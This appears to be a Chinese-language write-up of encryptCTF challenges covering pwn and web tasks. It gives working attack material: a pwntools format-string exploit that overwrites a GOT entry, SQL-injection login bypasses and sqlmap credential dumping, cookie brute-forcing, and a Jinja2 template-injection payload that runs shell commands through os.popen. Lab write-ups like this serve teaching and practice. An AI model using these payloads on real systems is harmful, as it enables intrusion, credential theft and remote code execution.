    aaaa(nil).0x2.(nil).0xffe571ce.0x1.0xc2.0x61616161.0x252e7025.0x70252e70.0x2e70252e
    i don't belive you!
    aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
简单测试了一下，可以发现格式化字符的offset是7，因为程序是32位的，可以直接用`pwntools`的`fmtstr_payload`函数。
    from pwn import *
    elf = ELF('./pwn4')
    p = remote('104.154.106.182', 5678)
    payload = fmtstr_payload(7,{elf.got['printf']:0x0804853D})
    p.sendlineafter('new?\n',payload)
    p.interactive()
## web
### Sweeeeeet
    Do you like sweets?
    http://104.154.106.182:8080
    author: codacker50
在响应包头得到一个flag，但是提交提示incorrect。
    Set-Cookie: FLAG=encryptCTF%7By0u_c4nt_U53_m3%7D
随后在请求包的cookie里面发现一个`UID=f899139df5e1059396431415e770c6dd`，查了一下为`md5(100)`，于是使用burp进行`0-999`md5后爆破UID
### Slash Slash
题目给了一个flask站的源码，
查看`application.py`，发现flag应该写进环境变量，而且使用了`virtualenv`设置虚拟环境，题目还提供了`virtualenv`的学习视频。
    import os
    from flask import Flask, render_template, jsonify
    app = Flask(__name__)
    '''
     secret_key using python3 secrets module
    '''
    app.secret_key = "9d367b3ba8e8654c6433379763e80c6e"
    '''
    Learn about virtualenv here:
    https://www.youtube.com/watch?v=N5vscPTWKOk&list=PL-osiE80TeTt66h8cVpmbayBKlMTuS55y&index=7
    '''
    FLAG = os.getenv("FLAG", "encryptCTF{}")
    @app.route('/')
    def index():
        return render_template('index.html')
    @app.route('/encryptCTF', methods=["GET"])
    def getflag():
            return jsonify({
                'flag': FLAG
            })
    if __name__ == '__main__':
        app.run(debug=False)
安装一下`virtualenv`，然后运行此虚拟环境，但是发现根本没有`$FLAG`。
    # kira @ k1r4 in ~/web/handout_slashslash/app [21:08:40]
    $ source ./env/bin/activate
    (env)
    # kira @ k1r4 in ~/web/handout_slashslash/app [21:08:57]
    $ echo $FLAG
直接查看一下`activate`文件，发现最后有一句被注销掉了，`RkxBRwo=`解码就是`FLAG`
    export $(echo RkxBRwo= | base64 -d)="ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg=="
那么直接解base64就getflag了。
    # kira @ k1r4 in ~/web/handout_slashslash/app [21:09:01]
    $ echo ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg==|base64 -d
    encryptCTF{comments_&_indentations_makes_johnny_a_good_programmer}
当然，将此行注销去掉，然后修改一下代码为`FLAG =
os.getenv("FLAG")`，就可以通过访问`http://127.0.0.1:5000/encryptCTF`得到flag
`virtualenv`的使用教程可以参考以下[链接](https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432712108300322c61f256c74803b43bfd65c6f8d0d0000)
### vault
    i heard you are good at breaking codes, can you crack this vault?
    http://104.154.106.182:9090
    author: codacker
打开地址后为一个登陆界面，随手试了一发万能密码`username=123' or 1#&password=123' or
1#`，成功登陆，返回一个二维码，扫描后为一个YouTube地址。
猜想flag可能存在数据库，手工测试一下发现可以注入
    username=123' or 1=1#&password=123   # 成功登陆
    username=123' or 1=2#&password=123   # 登陆失败
直接使用sqlmap跑出管理员密码，但是登陆后仍然是那个二维码，并没有flag
    +----+----------+----------------------------------+ 
    | id | username | password                         | 
    +----+----------+----------------------------------+ 
    | 1  | admin    | 21232f297a57a5a743894a0e4a801fc3 | 
    +----+----------+----------------------------------+
在数据库翻了半天，原来成功登陆的cookie就是flag，无语了。。。。
    Set-Cookie: SESSIONID=ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0%3D
解码后为：
    encryptCTF{i_H4t3_inJ3c7i0n5}
### Env
    Einstein said, "time was relative, right?"
    meme 1  https://i.imgur.com/LYS3TYi.jpg
    meme 2  https://i.imgur.com/FcsusMX
    http://104.154.106.182:6060
    Author: maskofmydisguise
第一张图片里面提示了两个目录`/home`和`/whatsthetime/`
访问`http://104.154.106.182:6060/whatsthetime`提示`Almost there...or are you?`。
然后访问`http://104.154.106.182:6060/whatsthetime/1`，获得一个新提示
查了一下`THE EPOCH TIME`是指1970年1月1日00:00:00 UTC，猜测后面的数字要为当前时间的时间戳才能出flag
    import time
    import requests
    url = 'http://104.154.106.182:6060/whatsthetime/'
    r = requests.get(url+str(int(time.time())))
    print r.content
写了一个简单的脚本尝试一下，发现不行，估计服务器时间跟我本地有误差，最近决定拿burp进行爆破，我用当前时间戳减去100，然后每次加1进行爆破，很快就出结果了，如下图所示。
### repeaaaaaat
    Can you repeaaaaaat?
    http://104.154.106.182:5050
    author: codacker
访问链接后出现一大堆logo，查看源码发现了一串base64，``，解码为`what_are_you_searching_for`。
然后访问`http://104.154.106.182:5050/what_are_you_searching_for`，又得到一串base64，解码后为一个视频链接`https://www.youtube.com/watch?v=5rAOyh7YmEc`
    HTTP/1.1 200 OK
    Server: gunicorn/19.9.0
    Date: Tue, 02 Apr 2019 13:22:51 GMT
    Connection: close
    Content-Type: text/html; charset=utf-8
    Content-Length: 429
        FLAG
         aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj01ckFPeWg3WW1FYwo= 
看完这个视频的我一脸懵逼，这是什么鬼？？？
迷惘几分钟后，发现返回包`server`字段比较陌生，Google一下`Gunicorn`
    Gunicorn 'Green Unicorn' is a Python WSGI HTTP Server for UNIX. It's a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.
可见这个网站是一个python站，看到python站，首先想到的是SSTI模板注入，简单测试了一下发现并没有反应
后面测试的时候发现主页下面的base64变了另外一个``，解码为：`/?secret=flag`，然后再测试一下发现可行了。
拿出一个常用的payload进行测试，返现返回500错误，但至少证明是成功运行了，可能本地的环境和远程的有些微差别。
    {{"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
一段一段地进行删除测试，发现`{{"".__class__.__mro__[-1].__subclasses__()[117]}}`的返回结果跟本地不一样
本地测试结果
    >>> "".__class__.__mro__[-1].__subclasses__()[117]
远程返回结果
删掉序号直接查看返回结果，发现是存在这个class的
那么修改一下payload为`{{"".__class__.__mro__[-1].__subclasses__()['os._wrap_close'].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}`，可正常返回结果。
最后payload为：
    {{"".__class__.__mro__[-1].__subclasses__()['os._wrap_close'].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat+flag*').read()")}}